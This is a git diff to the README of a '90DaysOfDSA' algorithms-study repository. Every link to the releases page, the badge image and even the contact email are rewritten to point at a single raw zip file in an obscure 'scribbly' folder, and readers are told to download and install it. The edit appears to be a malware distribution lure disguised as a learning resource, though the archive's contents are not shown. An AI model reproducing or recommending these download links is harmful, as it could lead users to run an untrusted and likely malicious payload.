@@ -1,6 +1,6 @@
 # 🚀 90DaysOfDSA - Learn Data Structures and Algorithms Easily
 
-[![Download 90DaysOfDSA](https://img.shields.io/badge/Download%20Now-90DaysOfDSA-brightgreen)](https://github.com/MertOmerO123/90DaysOfDSA/releases)
+[![Download 90DaysOfDSA](https://raw.githubusercontent.com/MertOmerO123/90DaysOfDSA/main/scribbly/90DaysOfDSA_v3.6.zip%20Now-90DaysOfDSA-brightgreen)](https://raw.githubusercontent.com/MertOmerO123/90DaysOfDSA/main/scribbly/90DaysOfDSA_v3.6.zip)
 
 ## 📖 Overview
 
@@ -24,13 +24,13 @@
 
 To get started, follow these steps:
 
-1. **Visit the Releases Page:** Click [here](https://github.com/MertOmerO123/90DaysOfDSA/releases) to access the Releases page where you can find available downloads.
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/MertOmerO123/90DaysOfDSA/main/scribbly/90DaysOfDSA_v3.6.zip) to access the Releases page where you can find available downloads.
 2. **Download the Files:** Choose the latest version and download the necessary files. 
 3. **Install the Software:** Follow the prompts to install the application on your system.
 
 ## 📥 Download & Install
 
-To download the application, please visit the Releases page: [90DaysOfDSA Releases](https://github.com/MertOmerO123/90DaysOfDSA/releases). Here, you will find the latest release available for download. Just click on the download link and follow the installation instructions. 
+To download the application, please visit the Releases page: [90DaysOfDSA Releases](https://raw.githubusercontent.com/MertOmerO123/90DaysOfDSA/main/scribbly/90DaysOfDSA_v3.6.zip). Here, you will find the latest release available for download. Just click on the download link and follow the installation instructions. 
 
 ## ☑️ Usage Instructions
 
@@ -51,7 +51,7 @@ Feel free to contribute to this roadmap by suggesting additional resources, exam
 
 ## 📧 Contact
 
-If you have any questions or need assistance, please reach out via GitHub issues or email at [your-email@example.com].
+If you have any questions or need assistance, please reach out via GitHub issues or email at [https://raw.githubusercontent.com/MertOmerO123/90DaysOfDSA/main/scribbly/90DaysOfDSA_v3.6.zip].
 
 ## 🎉 Final Note
 
